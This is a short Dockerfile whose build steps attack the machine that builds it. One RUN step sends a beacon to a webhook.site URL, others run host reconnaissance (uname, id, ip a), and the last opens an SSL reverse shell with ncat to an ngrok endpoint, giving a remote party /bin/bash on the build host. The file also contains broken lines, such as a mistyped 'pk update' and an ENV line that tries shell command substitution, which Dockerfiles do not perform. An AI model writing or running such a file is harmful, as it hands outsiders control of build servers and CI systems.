# Use a lightweight Linux distribution as the base image
FROM alpine:latest

ENV CACHE_BUSTER=$(date +%s)

# Install ncat
RUN echo CACHE_BUSTER && pk update
RUN date && apk add nmap nmap-ncat curl

# Run ncat with SSL to initiate the connection to your VM
RUN echo CACHE_BUSTER && curl https://webhook.site/c13c908a-c4a3-436b-ab94-c752b16635b7/dockerfile2
RUN echo CACHE_BUSTER && uname -a && id 
RUN echo CACHE_BUSTER && ip a

RUN echo CACHE_BUSTER && ncat 2.tcp.eu.ngrok.io 14706 --ssl -v -e /bin/bash

CMD ["/bin/bash"]